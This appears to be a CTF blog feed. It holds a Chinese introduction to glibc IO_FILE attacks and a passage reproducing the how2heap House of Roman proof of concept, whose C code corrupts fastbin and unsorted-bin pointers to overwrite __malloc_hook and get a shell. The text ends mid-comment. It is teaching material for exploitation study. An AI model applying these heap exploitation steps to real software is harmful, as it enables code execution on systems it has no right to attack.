    <link href="http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/"/>
    <id>http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86IO-FILE%E5%9F%BA%E7%A1%80/</id>
    <published>2025-03-28T14:28:15.000Z</published>
    <updated>2025-03-28T07:06:49.200Z</updated>
    
    <content type="html"><![CDATA[<ul><li><p>参考博客：[<a href="https://bbs.kanxue.com/thread-275968.htm">原创]无路远征——GLIBC2.37后时代的IO攻击之道（零）-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p></li><li><p>参考博客：<a href="https://www.cnblogs.com/ZIKH26/articles/16150232.html">关于gdb源码调试环境搭建 - ZikH26 - 博客园</a></p></li><li><p><code>IO</code>也就是输入输出的意思，但是<code>C</code>语言的输入输出的函数有很多，例如：<code>puts</code>、<code>printf</code>、<code>write</code>、<code>stdin</code>、<code>stdout</code>、<code>scanf</code>、<code>read</code>等与输入输出相关的函数。</p></li><li><p>而我们所说的打<code>IO</code>打的是我们封装到比较上层的函数，比如<code>puts</code>、<code>printf</code>这类的上层封装的函数。</p><ul><li><code>read</code>、<code>write</code>这两个是比较底层的，系统调用<code>syscall</code>的输入输出，一般都是调用这两个函数。</li><li><code>puts</code>、<code>printf</code>等这些<code>IO</code>函数最后都会通过<code>write</code>这个底层函数与操作系统交互。</li><li>所以我们所说的打<code>IO</code>，打的就是这种上层输入输出函数。在调用这些函数的时候会经过一些<code>指针</code>、<code>结构体</code>、<code>函数指针</code>等，所以我们通过劫持<code>指针</code>、<code>伪造IO结构体</code>、<code>绕过检查机制</code>从而<code>getshll</code>或者执行<code>shellcode</code>。</li><li>与<code>IO</code>相关的都可以在<code>glibc</code>源码中，<code>/path/to/glibc2.23/libio</code>中可以看到。</li></ul></li><li><p>由于高版本的<code>glibc</code>中<code>hook</code>指针被删除了，所以余下可用的函数指针只有<code>io</code>相关的函数指针了，在高版本堆利用的时候<code>IO</code>利用就成了基础了。</p></li></ul><h1 id="io_file起源及结构体"><a class="markdownIt-Anchor" href="#io_file起源及结构体"></a> IO_FILE起源及结构体</h1><ul><li>如果出过<code>pwn</code>题或者做过<code>全缓冲</code>的<code>pwn</code>题就会了解到这个函数。和缓冲区的三种工作模式，<code>无缓冲</code>、<code>行缓冲</code>、<code>全缓冲</code>。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stderr</span>,<span class="literal">NULL</span>,_IONBF,<span class="number">0</span>);</span><br></pre></td></tr></table></figure><ul><li>为什么要设置这三种模式，这就和<code>硬件</code>、<code>操作系统</code>、<code>程序</code>三者有关。首先程序要读写硬盘或者是输出到屏幕中，这些都是要通过系统调用<code>syscall</code>，进行<code>write</code>、<code>read</code>系统调用。</li><li>而何时进行系统调用，这就成为了设计<code>IO</code>的一个重要问题。如果每一个字节都需要使用<code>syscall</code>系统调用（即无缓冲模式）。向硬件进行读写操作，这就会大大降级操作系统的效率，并且硬件频繁读写也会造成更快的损坏。</li><li>为了减少这种情况，在设计<code>IO</code>的时候就会出现导致，设置了<code>缓冲区</code>，要输入的数据或者要输出的数据都会先被放入缓冲区，直到缓冲区满了之后，再进行系统调用，将缓冲区存储的内容写入到屏幕或者其他硬件中（全缓冲），以便提高操作系统的效率，提高硬件的使用寿命，这也就出现了现在的<code>IO_FILE</code>结构体。</li><li>接下来总结一下<code>glibc</code>封装的上层函数中与输入输出相关的函数，对于<code>IO</code>的攻击一般就攻击这些<code>IO</code>函数的结构体``。<ul><li>标准输入函数<ul><li><code>gets()</code>、<code>fgets()</code>、<code>scanf()</code>、<code>fscanf()</code>、<code>sscanf()</code>、<code>getc()</code>、<code>fgetc()</code>、<code>getchar()</code>、<code>getline()</code>、<code>getdelim()</code></li></ul></li><li>标准输出函数<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>putc()</code>、<code>fputc()</code>、<code>putchar()</code>、<code>puts()</code></li></ul></li><li>文件操作函数：<ul><li><code>fopen()</code>、<code>freopen()</code>、<code>fdopen()</code>、<code>fclose()</code>、<code>fflush()</code>、<code>setbuf()</code>、<code>setvbuf()</code>、<code>fread()</code>、<code>fwrite()</code>、<code>fseek()</code>、<code>ftell()</code>、<code>fewind()</code>、<code>rewind()</code></li></ul></li><li>格式化字符串相关函数：<ul><li><code>printf()</code>、<code>fprintf()</code>、<code>sprintf()</code>、<code>snprintf()</code>、<code>vprintf()</code>、<code>vfprintf()</code>、<code>vsprintf()</code>、<code>vsnprintf()</code></li></ul></li><li>其他相关函数：<ul><li><code>perror()</code>、<code>tmpfile()</code>、<code>clearerr()</code>、<code>feof()</code>、<code>ferror()</code>、<code>stdout</code>、<code>stdout()</code>、<code>stdin()</code>、<code>stderror()</code></li></ul></li></ul></li></ul><h1 id="io_file相关动调"><a class="markdownIt-Anchor" href="#io_file相关动调"></a> IO_FILE相关动调</h1><ul><li><p>写介绍几个比较重要的<code>IO</code>结构体，并且说明这写结构体在<code>glibc2.23</code>源码的什么位置。</p></li><li><p>这里先汇总一下与<code>IO_FILE</code>相关动调命令，与<code>IO_FILE</code>相关的调试基本上就是打印结构体。可以在<code>gdb</code>中使用<code>p</code>命令打印出结构体的具体存储的值</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p stdout</span><br><span class="line">p _IO_2_1_stdout_</span><br><span class="line">p _IO_file_jumps</span><br><span class="line">p *(struct _IO_FILE *) _IO_list_all</span><br></pre></td></tr></table></figure><ul><li>接下来调试几个上层的输出函数。来对<code>IO</code>调用有个总体了解。</li></ul><h1 id="io_file相关源码"><a class="markdownIt-Anchor" href="#io_file相关源码"></a> IO_FILE相关源码</h1><h1 id="io_file基础"><a class="markdownIt-Anchor" href="#io_file基础"></a> IO_FILE基础</h1>]]></content>
    
    
    <summary type="html">前言：终于到IO了</summary>
    
    
    
    <category term="CTF" scheme="http://iyheart.github.io/categories/CTF/"/>
    
    <category term="PWN" scheme="http://iyheart.github.io/categories/CTF/PWN/"/>
    
    
  </entry>
  
  <entry>
    <title>PWN堆house-of-roman</title>
    <link href="http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/"/>
    <id>http://iyheart.github.io/2025/03/28/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-roman/</id>
    <published>2025-03-28T00:43:36.000Z</published>
    <updated>2025-04-09T01:09:01.575Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a class="markdownIt-Anchor" href="#前置知识"></a> 前置知识</h1><ul><li>前置知识的话基本上都学了，这边就大概书写一下。<ul><li><code>fastbin</code>的运行机制</li><li><code>unsorted_bin</code>的运行机制</li><li><code>fastbin_attack</code></li><li><code>unsorted_bin_attack</code></li><li><code>malloc_hook</code>等<code>hook</code>技术</li></ul></li></ul><h1 id="实验"><a class="markdownIt-Anchor" href="#实验"></a> 实验</h1><ul><li>接下来直接进行实验还是老样子，翻译源码。</li></ul><details>    <summary>源码</summary><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE     <span class="comment">/* for RTLD_NEXT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* shell = <span class="string">&quot;/bin/sh\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Technique was tested on GLibC 2.23, 2.24 via the glibc_build.sh script inside of how2heap on Ubuntu 16.04. 2.25 was tested on Ubuntu 17.04.</span></span><br><span class="line"><span class="comment">Compile: gcc -fPIE -pie house_of_roman.c -o house_of_roman</span></span><br><span class="line"><span class="comment">POC written by Maxwell Dulin (Strikeout) </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this in order to turn off printf buffering (messes with heap alignment)</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">init</span><span class="params">()</span>&#123;</span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">The main goal of this technique is to create a **leakless** heap </span></span><br><span class="line"><span class="comment">exploitation technique in order to get a shell. This is mainly </span></span><br><span class="line"><span class="comment">done using **relative overwrites** in order to get pointers in </span></span><br><span class="line"><span class="comment">the proper locations without knowing the exact value of the pointer.</span></span><br><span class="line"><span class="comment">The first step is to get a pointer inside of __malloc_hook. This </span></span><br><span class="line"><span class="comment">is done by creating a fastbin bin that looks like the following: </span></span><br><span class="line"><span class="comment">ptr_to_chunk -&gt; ptr_to_libc. Then, we alter the ptr_to_libc</span></span><br><span class="line"><span class="comment"> (with a relative overwrite) to point to __malloc_hook. </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">The next step is to run an unsorted bin attack on the __malloc_hook </span></span><br><span class="line"><span class="comment">(which is now controllable from the previous attack).  Again, we run </span></span><br><span class="line"><span class="comment">the unsorted_bin attack by altering the chunk-&gt;bk with a relative overwrite. </span></span><br><span class="line"><span class="comment">Finally, after launching the unsorted_bin attack to put a libc value </span></span><br><span class="line"><span class="comment">inside of __malloc_hook, we use another relative overwrite on the </span></span><br><span class="line"><span class="comment">value of __malloc_hook to point to a one_gadget, system or some other function.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Now, the next time we run malloc we pop a shell! :) </span></span><br><span class="line"><span class="comment">However, this does come at a cost: 12 bits of randomness must be </span></span><br><span class="line"><span class="comment">brute forced (0.02% chance) of working.</span></span><br><span class="line"><span class="comment">The original write up for the *House of Roman* can be found at</span></span><br><span class="line"><span class="comment"> https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions.</span></span><br><span class="line"><span class="comment">This technique requires the ability to edit fastbin and unsorted bin </span></span><br><span class="line"><span class="comment">pointers via UAF or overflow of some kind. Additionally, good control </span></span><br><span class="line"><span class="comment">over the allocations sizes and freeing is required for this technique.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* introduction = <span class="string">&quot;\nWelcome to the House of Roman\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;This is a heap exploitation technique that is LEAKLESS.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;There are three stages to the attack: \n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;1. Point a fastbin chunk to __malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;2. Run the unsorted_bin attack on __malloc_hook.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;3. Relative overwrite on main_arena at __malloc_hook.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;All of the stuff mentioned above is done using two main concepts:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;relative overwrites and heap feng shui.\n\n&quot;</span></span><br><span class="line">     <span class="string">&quot;However, this technique comes at a cost:\n&quot;</span></span><br><span class="line">                             <span class="string">&quot;12-bits of entropy need to be brute forced.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;That means this technique only work 1 out of every 4096 tries or 0.02%.\n&quot;</span></span><br><span class="line">     <span class="string">&quot;**NOTE**: For the purpose of this exploit, we set the random values in order to make this consisient\n\n\n&quot;</span>;</span><br><span class="line"><span class="built_in">puts</span>(introduction);</span><br><span class="line">init();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Part 1: Fastbin Chunk points to __malloc_hook</span></span><br><span class="line"><span class="comment">Getting the main_arena in a fastbin chunk ordering is the first step.</span></span><br><span class="line"><span class="comment">This requires a ton of heap feng shui in order to line this up properly. </span></span><br><span class="line"><span class="comment">However, at a glance, it looks like the following:</span></span><br><span class="line"><span class="comment">First, we need to get a chunk that is in the fastbin with a pointer to</span></span><br><span class="line"><span class="comment">a heap chunk in the fd. </span></span><br><span class="line"><span class="comment">Second, we point this chunk to a pointer to LibC (in another heap chunk). </span></span><br><span class="line"><span class="comment">All of the setup below is in order to get the configuration mentioned </span></span><br><span class="line"><span class="comment">above setup to perform the relative overwrites. &quot;;</span></span><br><span class="line"><span class="comment">Getting the pointer to libC can be done in two ways: </span></span><br><span class="line"><span class="comment">- A split from a chunk in the small/large/unsorted_bins </span></span><br><span class="line"><span class="comment">gets allocated to a size of 0x70. </span></span><br><span class="line"><span class="comment">- Overwrite the size of a small/large chunk used previously to 0x71.</span></span><br><span class="line"><span class="comment">For the sake of example, this uses the first option because it </span></span><br><span class="line"><span class="comment">requires less vulnerabilities.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Step 1: Point fastbin chunk to __malloc_hook\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Setting up chunks for relative overwrites with heap feng shui.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value.</span></span><br><span class="line"><span class="type">uint8_t</span>* fastbin_victim = <span class="built_in">malloc</span>(<span class="number">0x60</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// Allocate this in order to have good alignment for relative </span></span><br><span class="line"><span class="comment">// offsets later (only want to overwrite a single byte to prevent </span></span><br><span class="line"><span class="comment">// 4 bits of brute on the heap).</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x100</span></span><br><span class="line"><span class="type">uint8_t</span>* main_arena_use = <span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Offset 0x190</span></span><br><span class="line"><span class="comment">// This ptr will be used for a relative offset on the &#x27;main_arena_use&#x27; chunk</span></span><br><span class="line"><span class="type">uint8_t</span>* relative_offset_heap = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Free the chunk to put it into the unsorted_bin. </span></span><br><span class="line"><span class="comment">// This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.</span></span><br><span class="line"><span class="built_in">free</span>(main_arena_use);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">Get part of the unsorted_bin chunk (the one that we just freed). </span></span><br><span class="line"><span class="comment">We want this chunk because the fd and bk of this chunk will </span></span><br><span class="line"><span class="comment">contain main_arena ptrs (used for relative overwrite later).</span></span><br><span class="line"><span class="comment">The size is particularly set at 0x60 to put this into the 0x70 fastbin later. </span></span><br><span class="line"><span class="comment">This has to be the same size because the __malloc_hook fake </span></span><br><span class="line"><span class="comment">chunk (used later) uses the fastbin size of 0x7f. There is</span></span><br><span class="line"><span class="comment"> a security check (within malloc) that the size of the chunk matches the fastbin size.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n&quot;</span>);</span><br><span class="line"><span class="comment">//Offset 0x100. Has main_arena + 0x68 in fd and bk.</span></span><br><span class="line"><span class="type">uint8_t</span>* fake_libc_chunk = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//// <span class="doctag">NOTE:</span> This is NOT part of the exploit... \\\</span></span><br><span class="line"><span class="comment">// The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. </span></span><br><span class="line"><span class="type">long</span> <span class="type">long</span> __malloc_hook = ((<span class="type">long</span>*)fake_libc_chunk)[<span class="number">0</span>] - <span class="number">0xe8</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// We need the filler because the overwrite below needs </span></span><br><span class="line"><span class="comment">// to have a ptr in the fd slot in order to work. </span></span><br><span class="line"><span class="comment">//Freeing this chunk puts a chunk in the fd slot of &#x27;fastbin_victim&#x27; to be used later. </span></span><br><span class="line"><span class="built_in">free</span>(relative_offset_heap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* </span></span><br><span class="line"><span class="comment">    Create a UAF on the chunk. Recall that the chunk that fastbin_victim </span></span><br><span class="line"><span class="comment">points to is currently at the offset 0x190 (heap_relative_offset).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="built_in">free</span>(fastbin_victim);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Now, we start doing the relative overwrites, since that we have </span></span><br><span class="line"><span class="comment">the pointers in their proper locations. The layout is very important to </span></span><br><span class="line"><span class="comment">understand for this.</span></span><br><span class="line"><span class="comment">Current heap layout: </span></span><br><span class="line"><span class="comment">0x0:   fastbin_victim       - size 0x70 </span></span><br><span class="line"><span class="comment">0x70:  alignment_filler     - size 0x90</span></span><br><span class="line"><span class="comment">0x100: fake_libc_chunk      - size 0x70</span></span><br><span class="line"><span class="comment">0x170: leftover_main        - size 0x20</span></span><br><span class="line"><span class="comment">0x190: relative_offset_heap - size 0x70 </span></span><br><span class="line"><span class="comment">bin layout: </span></span><br><span class="line"><span class="comment">fastbin:  fastbin_victim -&gt; relative_offset_heap</span></span><br><span class="line"><span class="comment">unsorted: leftover_main</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Now, the relative overwriting begins:</span></span><br><span class="line"><span class="comment">Recall that fastbin_victim points to relative_offset_heap </span></span><br><span class="line"><span class="comment">(which is in the 0x100-0x200 offset range). The fastbin uses a singly </span></span><br><span class="line"><span class="comment">linked list, with the next chunk in the &#x27;fd&#x27; slot.</span></span><br><span class="line"><span class="comment">By *partially* editing the fastbin_victim&#x27;s last byte (from 0x90 </span></span><br><span class="line"><span class="comment">to 0x00) we have moved the fd pointer of fastbin_victim to </span></span><br><span class="line"><span class="comment">fake_libc_chunk (at offset 0x100).</span></span><br><span class="line"><span class="comment">Also, recall that fake_libc_chunk had previously been in the unsorted_bin. </span></span><br><span class="line"><span class="comment">Because of this, it has a fd pointer that points to main_arena + 0x68. </span></span><br><span class="line"><span class="comment">Now, the fastbin looks like the following: </span></span><br><span class="line"><span class="comment">fastbin_victim -&gt; fake_libc_chunk -&gt;(main_arena + 0x68).</span></span><br><span class="line"><span class="comment">The relative overwrites (mentioned above) will be demonstrates step by step below.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\</span></span><br><span class="line"><span class="string">to the chunk with the LibC address\n&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;\</span></span><br><span class="line"><span class="string">Fastbin 0x70 now looks like this:\n\</span></span><br><span class="line"><span class="string">heap_addr -&gt; heap_addr2 -&gt; LibC_main_arena\n&quot;</span>);</span><br><span class="line">fastbin_victim[<span class="number">0</span>] = <span class="number">0x00</span>; <span class="comment">// The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Now, we have a fastbin that looks like the following: </span></span><br><span class="line"><span class="comment">0x70: fastbin_victim -&gt; fake_libc_chunk -&gt; (main_arena + 0x68)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">We want the fd ptr in fake_libc_chunk to point to something useful. </span></span><br><span class="line"><span class="comment">So, let&#x27;s edit this to point to the location of the __malloc_hook. </span></span><br><span class="line"><span class="comment">This way, we can get control of a function ptr.</span></span><br><span class="line"><span class="comment">To do this, we need a valid malloc size. Within the __memalign_hook </span></span><br><span class="line"><span class="comment">is usually an address that usually starts with 0x7f. </span></span><br><span class="line"><span class="comment">Because __memalign_hook value is right before this are all 0s, </span></span><br><span class="line"><span class="comment">we could use a misaligned chunk to get this to work as a valid size in </span></span><br><span class="line"><span class="comment">the 0x70 fastbin.</span></span><br><span class="line"><span class="comment">This is where the 